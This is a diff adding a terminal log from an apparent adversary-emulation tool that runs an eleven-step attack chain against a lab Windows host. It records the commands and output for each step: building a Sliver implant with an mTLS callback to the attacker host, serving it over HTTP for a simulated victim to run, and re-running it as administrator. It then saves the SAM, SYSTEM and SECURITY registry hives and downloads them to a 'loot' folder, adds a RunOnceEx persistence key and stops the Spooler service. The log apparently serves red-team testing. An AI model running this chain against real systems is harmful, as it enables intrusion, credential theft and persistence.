@@ -1,0 +1,242 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Desktop/Aurora-executor-demo/run-20260715T033707Z-78114f34/chain-005]
+└─$ python attack_chain.py --params attack_chain.params.yml
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[Sliver Console] Step 1
+
+📌[Name] Build the executable file of a Sliver implant (for Windows)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 8443 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/sliver_save/chain5.exe' , required: True): 
+
+[Sliver Console] Commands to run (one per line, copy each separately):
+  sliver > generate --mtls 192.168.56.43:8443 --os windows --arch 64bit --format exe --save /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain5.exe
+  sliver > mtls --lport 8443
+  ⚠ This step requires manual Sliver console interaction.
+Have you completed this Sliver console step? [y/n] (y): 
+
+📌[Human] Step 2
+
+📌[Name] Simulate the victim download and execute malicious payload file
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain5.exe' , required: True): 
+
+⚠ Human action required:
+╭─────────────────────────────────────────────────── Manual Step ────────────────────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically)                             │
+│ (On attacker's machine)                                                                                            │
+│ python -m http.server 8000                                                                                         │
+│                                                                                                                    │
+│ (On victim's machine)                                                                                              │
+│ 1. Open 192.168.56.43:8000 in the browser                                                                          │
+│ 2. Navigate to the path of the target payload file                                                                 │
+│ 3. Download the payload file                                                                                       │
+│ 4. Execute the payload file to C:\Users\Public\chain5.exe (If on a Linux machine, you also need to chmod the file) │
+│                                                                                                                    │
+╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 3
+📌[Name] Execute a Sliver Implant Payload
+[Session Check] Polling for new sliver session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+    [8d15f3d3-0094-4fd5-b89d-4ef7f30a481d] OPPOSITE_MATERIAL@WIN-BASE — WIN-BASE\useradmin (windows)
+➤ Session id to accept (default: 8d15f3d3-0094-4fd5-b89d-4ef7f30a481d, or 'n' to abort chain): 
+
+📌[Sliver Executor] Step 4
+
+📌[Name] User Context Verification
+ Parameter Input
+  Parameter: executor
+  Description: The session ID of the active Sliver connection.
+Available Sessions:
+[0] 8d15f3d3-0094-4fd5-b89d-4ef7f30a481d - OPPOSITE_MATERIAL@WIN-BASE - WIN-BASE\useradmin(windows)
+Select session number: 0
+
+[Sliver Executor] Executing: whoami
+Keep going with the next attack step? [y/n] (y): 
+Exec Stdout: "win-base\useradmin\r\n"
+Pid: 3684
+
+
+📌[Human] Step 5
+
+📌[Name] Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable as Admin
+ Parameter Input
+  Parameter: EXE_PATH
+  Description: Path of the executable the shortcut points at
+  ✓ Using stored value: C:\Users\Public\chain5.exe
+
+⚠ Human action required:
+╭────────────────────────────────────────────────────── Manual Step ───────────────────────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically)                                   │
+│ (On victim's machine, on the desktop or a folder)                                                                        │
+│ Right-click a shortcut (.lnk) whose target is:                                                                           │
+│ C:\Users\Public\chain5.exe                                                                                               │
+│ then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click). │
+│                                                                                                                          │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 6
+📌[Name] Execute a Sliver Implant Payload
+[Session Check] Polling for new sliver session (30s)…
+  Previously known sessions: ['8d15f3d3-0094-4fd5-b89d-4ef7f30a481d']
+  Newly detected session(s):
+    [7b741bdb-8e4a-42ee-943c-627966e28fd3] OPPOSITE_MATERIAL@WIN-BASE — WIN-BASE\useradmin (windows)
+➤ Session id to accept (default: 7b741bdb-8e4a-42ee-943c-627966e28fd3, or 'n' to abort chain): 
+
+📌[Sliver Session Derive] Step 7
+📌[Name] Execute Command (cmd.exe)
+ Parameter Input
+  Parameter: executor_parent
+  Description: The session ID of the active Sliver connection.
+Available Sessions:
+[0] 8d15f3d3-0094-4fd5-b89d-4ef7f30a481d - OPPOSITE_MATERIAL@WIN-BASE - WIN-BASE\useradmin(windows)
+[1] 7b741bdb-8e4a-42ee-943c-627966e28fd3 - OPPOSITE_MATERIAL@WIN-BASE - WIN-BASE\useradmin(windows)
+Select session number: 1
+  ↳ Derived executor_derived executor from Sliver session 7b741bdb-8e4a-42ee-943c-627966e28fd3
+
+📌[Command Prompt Executor] Step 8
+
+📌[Name] Registry dump of SAM, creds, and secrets
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke reg save.
+  ✓ Using stored value: 7b741bdb-8e4a-42ee-943c-627966e28fd3
+ Parameter Input
+  Parameter: save_dir
+  Description: Directory on the target where the SAM / SYSTEM / SECURITY hives are written.
+➤ Enter value for save_dir (current: 'C:\\Users\\Public\\samdump' , required: True): 
+
+[Command Prompt Executor] Command to run via Sliver:
+  if not exist "C:\Users\Public\samdump" mkdir "C:\Users\Public\samdump"
+reg save HKLM\sam C:\Users\Public\samdump\sam
+reg save HKLM\system C:\Users\Public\samdump\system
+reg save HKLM\security C:\Users\Public\samdump\security
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+[*] Target session OS is: windows
+Executing with cmd.exe: if not exist C:\Users\Public\samdump mkdir C:\Users\Public\samdump
+Executing with cmd.exe: reg save HKLM\sam C:\Users\Public\samdump\sam
+  stdout: The operation completed successfully.
+Executing with cmd.exe: reg save HKLM\system C:\Users\Public\samdump\system
+  stdout: The operation completed successfully.
+Executing with cmd.exe: reg save HKLM\security C:\Users\Public\samdump\security
+  stdout: The operation completed successfully.
+
+📌[Sliver Executor] Step 9
+
+📌[Name] File Download Operation
+ Parameter Input
+  Parameter: executor
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: 8d15f3d3-0094-4fd5-b89d-4ef7f30a481d
+ Parameter Input
+  Parameter: remote_path
+  Description: Full path to remote file/directory
+  ✓ Using stored value: C:\Users\Public\samdump
+ Parameter Input
+  Parameter: recurse
+  Description: Recursive download (true/false)
+➤ Enter value for recurse (current: True , required: True): 
+ Parameter Input
+  Parameter: output_dir
+  Description: Local directory to save files
+➤ Enter value for output_dir (current: '/home/kali/Desktop/Aurora-executor-demo/loot' , required: True): 
+
+[Sliver Executor] Executing: download
+Keep going with the next attack step? [y/n] (y): 
+File saved to: /home/kali/Desktop/Aurora-executor-demo/loot/C:\Users\Public\samdump
+
+📌[Command Prompt Executor] Step 10
+
+📌[Name] Reg Key RunOnce
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke reg add.
+  ✓ Using stored value: 7b741bdb-8e4a-42ee-943c-627966e28fd3
+ Parameter Input
+  Parameter: command_to_execute
+  Description: Command / path to execute at next system boot.
+➤ Enter value for command_to_execute (current: 'C:\\Windows\\System32\\notepad.exe' , required: True): 
+
+[Command Prompt Executor] Command to run via Sliver:
+  REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Windows\System32\notepad.exe"
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+[*] Target session OS is: windows
+Executing with cmd.exe: REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d C:\Windows\System32\notepad.exe
+  stdout: The operation completed successfully.
+
+📌[Command Prompt Executor] Step 11
+
+📌[Name] Windows - Stop service using Service Controller
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke sc.exe.
+  ✓ Using stored value: 7b741bdb-8e4a-42ee-943c-627966e28fd3
+ Parameter Input
+  Parameter: service_name
+  Description: Name of the Windows service to stop.
+➤ Enter value for service_name (current: 'Spooler' , required: True): 
+
+[Command Prompt Executor] Command to run via Sliver:
+  sc.exe stop Spooler
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+[*] Target session OS is: windows
+Executing with cmd.exe: sc.exe stop Spooler
+  stdout: 
+SERVICE_NAME: Spooler 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 1  STOPPED 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+══════════════════════════════════════════════════════════════════════
+  Attack Chain Run Summary
+══════════════════════════════════════════════════════════════════════
+Step  Name                                                                                  Start                    End                      Duration  Status
+   1  Build the executable file of a Sliver implant (for Windows)                           2026-07-18 19:06:38 UTC  2026-07-18 19:08:00 UTC    1m 22s    ✓   
+   2  Simulate the victim download and execute malicious payload file                       2026-07-18 19:08:00 UTC  2026-07-18 19:08:36 UTC     36.5s    ✓   
+   3  Execute a Sliver Implant Payload                                                      2026-07-18 19:08:36 UTC  2026-07-18 19:08:37 UTC      1.2s    ✓   
+   4  User Context Verification                                                             2026-07-18 19:08:37 UTC  2026-07-18 19:08:40 UTC      2.7s    ✓   
+   5  Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged executable  2026-07-18 19:08:40 UTC  2026-07-18 19:08:52 UTC     12.0s    ✓   
+      as Admin                                                                                                                                                
+   6  Execute a Sliver Implant Payload                                                      2026-07-18 19:08:52 UTC  2026-07-18 19:08:53 UTC      1.1s    ✓   
+   7  Execute Command (cmd.exe)                                                             2026-07-18 19:08:53 UTC  2026-07-18 19:08:55 UTC      2.0s    ✓   
+   8  Registry dump of SAM, creds, and secrets                                              2026-07-18 19:08:55 UTC  2026-07-18 19:08:59 UTC      3.9s    ✓   
+   9  File Download Operation                                                               2026-07-18 19:08:59 UTC  2026-07-18 19:09:04 UTC      5.0s    ✓   
+  10  Reg Key RunOnce                                                                       2026-07-18 19:09:04 UTC  2026-07-18 19:09:09 UTC      5.4s    ✓   
+  11  Windows - Stop service using Service Controller                                       2026-07-18 19:09:09 UTC  2026-07-18 19:09:12 UTC      2.1s    ✓   
+
+  Total: 11 steps executed (11 ✓, 0 ?, 0 ✗) in 2m 34s
+══════════════════════════════════════════════════════════════════════
